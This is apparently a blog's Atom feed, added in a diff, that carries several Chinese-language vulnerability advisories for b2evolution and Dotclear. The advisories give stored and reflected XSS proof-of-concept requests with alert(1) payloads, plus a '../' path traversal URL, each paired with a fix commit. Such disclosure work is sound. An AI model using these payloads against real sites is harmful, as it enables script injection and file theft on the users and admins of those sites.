@@ -1,0 +1,343 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+ <title>储藏间</title>
+ <link href="http://localhost:4000/atom.xml" rel="self"/>
+ <link href="http://localhost:4000/"/>
+ <updated>2017-02-06T14:25:25+08:00</updated>
+ <id>http://localhost:4000</id>
+ <author>
+   <name>kevinoclam</name>
+   <email></email>
+ </author>
+
+ 
+ <entry>
+   <title>Mybb Backup Acp</title>
+   <link href="http://localhost:4000/2017/02/06/Mybb-backup-acp/"/>
+   <updated>2017-02-06T00:00:00+08:00</updated>
+   <id>http://localhost:4000/2017/02/06/Mybb-backup-acp</id>
+   <content type="html">
+</content>
+ </entry>
+ 
+ <entry>
+   <title>B2evolution v6.4.7 website title XSS [CVE-2016-7150]</title>
+   <link href="http://localhost:4000/2016/12/29/b2evolution-xss-3/"/>
+   <updated>2016-12-29T00:00:00+08:00</updated>
+   <id>http://localhost:4000/2016/12/29/b2evolution-xss-3</id>
+   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;
+
+&lt;p&gt;发现日期: 2016-08-11&lt;/p&gt;
+
+&lt;p&gt;下载地址: &lt;a href=&quot;http://b2evolution.net/downloads/&quot;&gt;b2evolution&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;作者: b2evolution.net&lt;/p&gt;
+
+&lt;p&gt;作者通知日期: 2016-08-11&lt;/p&gt;
+
+&lt;p&gt;作者联系手段: http://b2evolution.net/?disp=msgform&lt;/p&gt;
+
+&lt;p&gt;CVE-ID：CVE-2016-7150&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
+b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a “one click install” web app.&lt;a href=&quot;Wiki&quot;&gt;3&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;There is stored XSS in b2evolution version 6.7.4&lt;/p&gt;
+
+&lt;p&gt;An authentic user can inject javascript code in the website header.&lt;/p&gt;
+
+&lt;p&gt;A moderator can change the “Short site name” or the “Longe site name” at back-office site-settings page with something like {test_short_name_xss” onmouseover=alert(1) on}.&lt;/p&gt;
+
+&lt;p&gt;Step 1 : Login the back-office as a moderator&lt;/p&gt;
+
+&lt;p&gt;Step 2 : Edit the “Short site name” at http://192.168.204.128/b2evolution/
+admin.php?ctrl=collections&amp;amp;tab=site_settings with something like {test_short_name_xss” onmouseover=alert(1) on}&lt;/p&gt;
+
+&lt;p&gt;Step 3 : Save the changes&lt;/p&gt;
+
+&lt;p&gt;Step 4 : Anyone view the site, when the mouse over the content(the header of the site), the XSS code runs.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;PoC:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+POST /b2evolution/admin.php HTTP/1.1
+Host: 192.168.204.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.128/b2evolution/admin.php?ctrl=collections&amp;amp;tab=site_settings
+Cookie: session_b2evo_192_168_204_128=50_BTD1n98LyyQAYUsyXDD4Kv9IPvGwEVO0; __smToken=AhuNTZNC8BaMfAVQV7ZpTW5a; evo_style=Variation
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 646
+
+site_code=b2evo&amp;amp;site_color=%23ff8c0f&amp;amp;notification_short_name=test_short_name_xss%22onmouseover%3D%22alert%281%29%22on%3D%221&amp;amp;notification_long_name=_name&amp;amp;notification_logo=http%3A%2F%2Ftesttest1.test&amp;amp;site_footer_text=C%22ookies+are+required+to+enable+core+site+functionality.+%26copy%3B%24year%24+by+%24short_site_name%24.&amp;amp;site_skins_enabled=1&amp;amp;site_terms=12&amp;amp;default_blog_ID=1&amp;amp;info_blog_ID=1&amp;amp;login_blog_ID=1&amp;amp;msg_blog_ID=1&amp;amp;reloadpage_timeout_value=5&amp;amp;reloadpage_timeout_name=minute&amp;amp;general_cache_enabled=1&amp;amp;submit=Save+Changes%21&amp;amp;crumb_collectionsettings=cxoiVqilvis2bz9Se6WJsIc2DTgvhQFX&amp;amp;ctrl=collections&amp;amp;tab=site_settings&amp;amp;action=update_settings_site
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Fix:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://github.com/b2evolution/b2evolution/commit/dd975fff7fce81bf12f9c59edb1a99475747c83c&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>B2evolution v6.4.7 forum XSS [CVE-2016-7149]</title>
+   <link href="http://localhost:4000/2016/12/29/b2evolution-xss-2/"/>
+   <updated>2016-12-29T00:00:00+08:00</updated>
+   <id>http://localhost:4000/2016/12/29/b2evolution-xss-2</id>
+   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;
+
+&lt;p&gt;发现日期: 2016-08-11&lt;/p&gt;
+
+&lt;p&gt;下载地址: &lt;a href=&quot;http://b2evolution.net/downloads/&quot;&gt;b2evolution&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;作者: b2evolution.net&lt;/p&gt;
+
+&lt;p&gt;作者通知日期: 2016-08-11&lt;/p&gt;
+
+&lt;p&gt;作者联系手段: http://b2evolution.net/?disp=msgform&lt;/p&gt;
+
+&lt;p&gt;CVE-ID：CVE-2016-7149&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
+b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a “one click install” web app.&lt;a href=&quot;Wiki&quot;&gt;3&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;B2evolutioes stored XSS in b2evolution version 6.7.5&lt;/p&gt;
+
+&lt;p&gt;Any user can post a forum with some evil code in it.&lt;/p&gt;
+
+&lt;p&gt;And when the admin see the forum, the page is lack of filter to protect the admin.&lt;/p&gt;
+
+&lt;p&gt;Step 1 : Register a user of the web-site, active the user by mail.&lt;/p&gt;
+
+&lt;p&gt;Step 2 : Post a forum with some thing like&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+[test_forum_xss](http://test.forum.xss&quot;onmouseover=&quot;alert(1)&quot;on=&quot;1 &quot;test_forum_xss&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Step 3 : Save the changes&lt;/p&gt;
+
+&lt;p&gt;Step 4 : Any user view the forum, when the mouse over the content, the XSS code runs.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;PoC:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+POST /b2evolution/htsrv/item_edit.php HTTP/1.1
+Host: 192.168.204.130
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.130/b2evolution/index.php/forums/?disp=edit&amp;amp;cat=17
+Cookie: session_b2evo_192_168_204_130=41_UqjtnJWp3oJZWVMtpznHzh4zgKxvBvTR; session_b2evo=87_j6i55FblKwr7rWFbheuTwjRaLbiN6ghM
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 636
+
+post_title=test_forum_xss&amp;amp;content=%5Btest_forum_xss%5D%28http%3A%2F%2Ftest.forum.xss%22onmouseover%3D%22alert%281%29%22on%3D%221+%22test_forum_xss%22%29%0D%0A&amp;amp;renderers_displayed=1&amp;amp;renderers%5B%5D=b2evMark&amp;amp;renderers%5B%5D=b2evWiLi&amp;amp;renderers%5B%5D=b2evGMco&amp;amp;renderers%5B%5D=b2evALnk&amp;amp;renderers%5B%5D=evo_videoplug&amp;amp;renderers%5B%5D=b2WPAutP&amp;amp;post_category=17&amp;amp;post_extracats%5B%5D=17&amp;amp;actionArray%5Bcreate%5D=&amp;amp;crumb_item=IT6Hs70o5KE9J0kgz9nmWNnAhCfW4qeo&amp;amp;ctrl=items&amp;amp;blog=5&amp;amp;post_ID=0&amp;amp;redirect_to=http%3A%2F%2F192.168.204.130%2Fb2evolution%2Findex.php%2Fforums%2F%3Fdisp%3Dedit&amp;amp;preview=0&amp;amp;more=1&amp;amp;preview_userid=8&amp;amp;item_typ_ID=6&amp;amp;post_status=community
+edited_user_login=kevino&amp;amp;edited_user_firstname=kevino&amp;amp;edited_user_lastname=kevino&amp;amp;edited_user_nickname=kevino&amp;amp;edited_user_gender=M&amp;amp;edited_user_ctry_ID=&amp;amp;edited_user_rgn_ID=&amp;amp;edited_user_subrg_ID=&amp;amp;edited_user_city_ID=&amp;amp;edited_user_age_min=&amp;amp;edited_user_age_max=&amp;amp;organizations%5B%5D=&amp;amp;uf_38=kevino&amp;amp;uf_39=kevino&amp;amp;uf_40=kevino&amp;amp;uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&amp;amp;uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&amp;amp;uf_43=http%3A%2F%2Fkevino.net%2Fkevino&amp;amp;new_field_type=3&amp;amp;actionArray%5Bupdate%5D=Save+Changes%21&amp;amp;crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&amp;amp;user_tab=profile&amp;amp;identity_form=1&amp;amp;user_ID=8&amp;amp;blog=1&amp;amp;orig_user_ID=8&amp;amp;12_3=4_56
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Fix:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://github.com/b2evolution/b2evolution/commit/9a4ab85439d1b838ee7b8eeebbf59174bb787811&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>B2evolution v6.4.7 XSS [CVE-2016-6821]</title>
+   <link href="http://localhost:4000/2016/12/28/b2evolution-xss/"/>
+   <updated>2016-12-28T00:00:00+08:00</updated>
+   <id>http://localhost:4000/2016/12/28/b2evolution-xss</id>
+   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;
+
+&lt;p&gt;发现日期: 2016-08-09&lt;/p&gt;
+
+&lt;p&gt;下载地址: &lt;a href=&quot;http://b2evolution.net/downloads/&quot;&gt;b2evolution&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;作者: b2evolution.net&lt;/p&gt;
+
+&lt;p&gt;作者通知日期: 2016-08-09&lt;/p&gt;
+
+&lt;p&gt;作者联系手段: http://b2evolution.net/?disp=msgform&lt;/p&gt;
+
+&lt;p&gt;CVE-ID：CVE-2016-6821&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;b2evolution is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
+b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a “one click install” web app.&lt;a href=&quot;Wiki&quot;&gt;3&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;B2evolution v6.7.4有一个存储型XSS
+任意用户可以编辑用户信息内的twitter信息来插入恶意代码
+当管理员在后台查看用户信息时候，插入的恶意代码将会执行&lt;/p&gt;
+
+&lt;p&gt;第一步: 注册一个用户&lt;/p&gt;
+
+&lt;p&gt;第二步: &lt;a href=&quot;http://192.168.204.128/b2evolution/index.php?disp=profile&quot;&gt;编辑自己的twitter信息&lt;/a&gt;,在其中添加恶意代码，如https://twitter.com/kevino”onmouseover=”alert(1)”onerror=1&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;PoC:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+POST /b2evolution/htsrv/profile_update.php HTTP/1.1
+Host: 192.168.204.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.204.128/b2evolution/index.php?disp=profile
+Cookie: {the cookies}
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 653
+
+edited_user_login=kevino&amp;amp;edited_user_firstname=kevino&amp;amp;edited_user_lastname=kevino&amp;amp;edited_user_nickname=kevino&amp;amp;edited_user_gender=M&amp;amp;edited_user_ctry_ID=&amp;amp;edited_user_rgn_ID=&amp;amp;edited_user_subrg_ID=&amp;amp;edited_user_city_ID=&amp;amp;edited_user_age_min=&amp;amp;edited_user_age_max=&amp;amp;organizations%5B%5D=&amp;amp;uf_38=kevino&amp;amp;uf_39=kevino&amp;amp;uf_40=kevino&amp;amp;uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&amp;amp;uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&amp;amp;uf_43=http%3A%2F%2Fkevino.net%2Fkevino&amp;amp;new_field_type=3&amp;amp;actionArray%5Bupdate%5D=Save+Changes%21&amp;amp;crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&amp;amp;user_tab=profile&amp;amp;identity_form=1&amp;amp;user_ID=8&amp;amp;blog=1&amp;amp;orig_user_ID=8&amp;amp;12_3=4_56
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;strong&gt;Fix:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://github.com/b2evolution/b2evolution/commit/83c40129f471b659755491a02b2ad981995d37c1&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Dotclear v2.9.1 路径遍历</title>
+   <link href="http://localhost:4000/2016/12/27/dotclear-path_travel/"/>
+   <updated>2016-12-27T00:00:00+08:00</updated>
+   <id>http://localhost:4000/2016/12/27/dotclear-path_travel</id>
+   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;
+
+&lt;p&gt;发现日期: 2016-08-01&lt;/p&gt;
+
+&lt;p&gt;下载地址: &lt;a href=&quot;https://dotclear.org/download&quot;&gt;dotclear&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;作者: dotclear.org&lt;/p&gt;
+
+&lt;p&gt;作者通知日期: 2016-08-01&lt;/p&gt;
+
+&lt;p&gt;作者联系手段: security@dotclear.net&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;渣翻&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Dotclear是一个基于GUN GPLv2的开源博客发布应用。在2002年由Olivier Meunier开发，现在已经吸引了一大个开发团队。在法语国家非常流行，并且为几个大型博客平台所用。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;在media.php这儿有个路径遍历问题&lt;/p&gt;
+
+&lt;p&gt;/admin/media.php&lt;/p&gt;
+
+&lt;p&gt;line 172 ~ line193&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+if (!empty($_GET['zipdl']) &amp;amp;&amp;amp; $core-&amp;gt;auth-&amp;gt;check('media_admin',$core-&amp;gt;blog-&amp;gt;id))
+{
+	try
+	{
+		@set_time_limit(300);
+		$fp = fopen('php://output','wb');
+		$zip = new fileZip($fp);
+		$zip-&amp;gt;addExclusion('#(^|/).(.*?)_(m|s|sq|t).jpg$#');
+		$zip-&amp;gt;addDirectory($core-&amp;gt;media-&amp;gt;root.'/'.$d,'',true);
+
+		header('Content-Disposition: attachment;filename='.date('Y-m-d').'-'.$core-&amp;gt;blog-&amp;gt;id.'-'.($d ? $d : 'media').'.zip');
+		header('Content-Type: application/x-zip');
+		$zip-&amp;gt;write();
+		unset($zip);
+		exit;
+	}
+	catch (Exception $e)
+	{
+		$core-&amp;gt;error-&amp;gt;add($e-&amp;gt;getMessage());
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在参数$d这儿少了过滤，”../”应该删掉&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;http://192.168.204.130/dotclear/admin/media.php?popup=0&amp;amp;select=0&amp;amp;zipdl=1&amp;amp;d=../../../&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Fix&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://hg.dotclear.org/dotclear/rev/282b26727770&lt;/p&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>Dotclear v2.9.1反射型xss [CVE-2016-6523]</title>
+   <link href="http://localhost:4000/2016/12/26/dotclear-xss/"/>
+   <updated>2016-12-26T00:00:00+08:00</updated>
+   <id>http://localhost:4000/2016/12/26/dotclear-xss</id>
+   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;
+
+&lt;p&gt;发现日期: 2016-08-01&lt;/p&gt;
+
+&lt;p&gt;下载地址: &lt;a href=&quot;https://dotclear.org/download&quot;&gt;dotclear&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;作者: dotclear.org&lt;/p&gt;
+
+&lt;p&gt;作者通知日期: 2016-08-01&lt;/p&gt;
+
+&lt;p&gt;作者联系手段: security@dotclear.net&lt;/p&gt;
+
+&lt;p&gt;CVE ID: CVE-2016-6523&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;渣翻&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Dotclear是一个基于GUN GPLv2的开源博客发布应用。在2002年由Olivier Meunier开发，现在已经吸引了一大个开发团队。在法语国家非常流行，并且为几个大型博客平台所用。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Dotclear v2.9.1 有一个反射型xss&lt;/p&gt;
+
+&lt;p&gt;/admin/media.php&lt;/p&gt;
+
+&lt;p&gt;line 34 $link_type = !empty($_REQUEST[‘link_type’]) ? $_REQUEST[‘link_type’] : null;&lt;/p&gt;
+
+&lt;p&gt;line 62 $q = isset($_REQUEST[‘q’]) ? $_REQUEST[‘q’] : null;&lt;/p&gt;
+
+&lt;p&gt;link_type 跟 q 参数缺少安全过滤&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;PoC:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;http://172.16.146.130/dotclear/admin/media.php?q=77777%3C%2Fspan%3E%3Cscript%3Ealert(1)%3C/script%3E&amp;amp;popup=0&amp;amp;select=0&amp;amp;plugin_id=&amp;amp;post_id=&amp;amp;link_type=&lt;/p&gt;
+
+&lt;p&gt;http://172.16.146.130/dotclear/admin/media.php?q=77777&amp;amp;popup=0&amp;amp;select=0&amp;amp;plugin_id=&amp;amp;post_id=&amp;amp;link_type=8888%22%3E%3Cscript%3Ealert(1)%3C/script%3E&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;修复方案:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;https://hg.dotclear.org/dotclear/rev/40d0207e520d&lt;/p&gt;
+</content>
+ </entry>
+ 
+
+</feed>
